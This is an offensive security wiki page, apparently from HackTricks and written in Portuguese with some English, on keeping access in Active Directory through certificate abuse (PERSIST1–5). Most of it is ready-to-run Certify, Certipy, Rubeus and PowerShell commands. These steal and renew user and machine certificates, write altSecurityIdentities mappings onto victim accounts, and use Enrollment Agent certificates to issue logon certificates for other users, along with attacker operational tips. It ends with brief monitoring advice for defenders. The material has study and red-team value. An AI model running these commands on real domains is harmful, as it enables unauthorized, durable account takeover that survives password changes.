# AD CS Persistência de Conta

{{#include ../../../banners/hacktricks-training.md}}

**Esta é uma pequena síntese dos capítulos sobre persistência de conta da excelente pesquisa de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Entendendo o Furto Ativo de Credenciais de Usuário com Certificados – PERSIST1

Em um cenário onde um certificado que permite autenticação de domínio pode ser solicitado por um usuário, um atacante tem a oportunidade de solicitar e roubar esse certificado para manter persistência em uma rede. Por padrão, o `User` template no Active Directory permite tais solicitações, embora às vezes possa estar desabilitado.

Usando [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), você pode procurar templates habilitados que permitam autenticação de cliente e então solicitar um:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
O poder de um certificado está na sua capacidade de autenticar-se como o usuário a que pertence, independentemente de alterações de senha, enquanto o certificado permanecer válido.

Você pode converter PEM para PFX e usá-lo para obter um TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinado com outras técnicas (veja as seções THEFT), a autenticação baseada em certificados permite acesso persistente sem tocar no LSASS e até mesmo a partir de contextos não elevados.

## Obtendo Persistência da Máquina com Certificados - PERSIST2

Se um atacante tiver privilégios elevados em um host, ele pode solicitar um certificado para a conta de máquina do sistema comprometido usando o template padrão `Machine`. Autenticar-se como a máquina habilita S4U2Self para serviços locais e pode fornecer persistência durável no host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendendo a Persistência por Meio da Renovação de Certificados - PERSIST3

Abusar dos períodos de validade e renovação de certificate templates permite que um atacante mantenha acesso de longo prazo. Se você possuir um certificate previamente emitido e sua private key, você pode renová-lo antes da expiração para obter uma credencial nova e de longa duração sem deixar request artifacts adicionais vinculados ao principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Dica operacional: Acompanhe os tempos de vida dos arquivos PFX em posse do atacante e renove-os cedo. A renovação também pode fazer com que certificados atualizados incluam a extensão moderna de mapeamento SID, mantendo-os utilizáveis sob regras de mapeamento DC mais rígidas (veja a próxima seção).

## Plantando mapeamentos explícitos de certificados (altSecurityIdentities) – PERSIST4

Se você puder escrever no atributo `altSecurityIdentities` de uma conta alvo, pode mapear explicitamente um certificado controlado pelo atacante para essa conta. Isso persiste mesmo depois de alterações de senha e, quando são usados formatos de mapeamento fortes, continua funcional sob a aplicação moderna do DC.

Fluxo de alto nível:

1. Obtenha ou emita um certificado client-auth que você controle (por exemplo, inscrever o template `User` em seu nome).
2. Extraia um identificador forte do certificado (Issuer+Serial, SKI, ou SHA1-PublicKey).
3. Adicione um mapeamento explícito no atributo `altSecurityIdentities` do principal vítima usando esse identificador.
4. Autentique-se com seu certificado; o DC o mapeia para a vítima através do mapeamento explícito.

Exemplo (PowerShell) usando um mapeamento forte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Em seguida, autentique-se com seu PFX. Certipy obterá um TGT diretamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construindo Mapeamentos Fortes para `altSecurityIdentities`

Na prática, os mapeamentos **Issuer+Serial** e **SKI** são os formatos fortes mais fáceis de construir a partir de um certificado em posse do atacante. Isso importa após **February 11, 2025**, quando os DCs passam a usar **Full Enforcement** por padrão e mapeamentos fracos deixam de ser confiáveis.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

Para mais sobre mapeamentos explícitos fracos e caminhos de ataque, veja:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
A revogação do certificado do agente ou das permissões do template é necessária para remover essa persistência.

Notas operacionais
- Versões modernas do `Certipy` suportam tanto `-on-behalf-of` quanto `-renew`, então um atacante que possua um Enrollment Agent PFX pode emitir e posteriormente renovar certificados leaf sem precisar tocar novamente na conta alvo original.
- Se a obtenção de TGT baseada em PKINIT não for possível, o certificado on-behalf-of resultante ainda pode ser usado para autenticação Schannel com `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impacto na Persistência

Microsoft KB5014754 introduziu o Strong Certificate Mapping Enforcement em controladores de domínio. Desde 11 de fevereiro de 2025, os DCs têm por padrão Full Enforcement, rejeitando mapeamentos fracos/ambíguos. Implicações práticas:

- Certificados pré-2022 que não possuem a extensão de mapeamento de SID podem falhar no mapeamento implícito quando os DCs estão em Full Enforcement. Atacantes podem manter acesso renovando certificados através do AD CS (para obter a extensão SID) ou plantando um mapeamento explícito forte em `altSecurityIdentities` (PERSIST4).
- Mapeamentos explícitos usando formatos fortes (Issuer+Serial, SKI, SHA1-PublicKey) continuam funcionando. Formatos fracos (Issuer/Subject, Subject-only, RFC822) podem ser bloqueados e devem ser evitados para persistência.

Os administradores devem monitorar e gerar alertas sobre:
- Mudanças em `altSecurityIdentities` e emissões/renovações de certificados Enrollment Agent e de usuário.
- Logs de emissão da CA para requisições on-behalf-of e padrões incomuns de renovação.

## Referências

- Microsoft. KB5014754: Mudanças na autenticação baseada em certificado em controladores de domínio do Windows (cronograma de aplicação e mapeamentos fortes).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (abuso explícito de `altSecurityIdentities` em objetos de usuário/computador).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Referência de comandos (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Autenticando com certificados quando PKINIT não é suportado.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
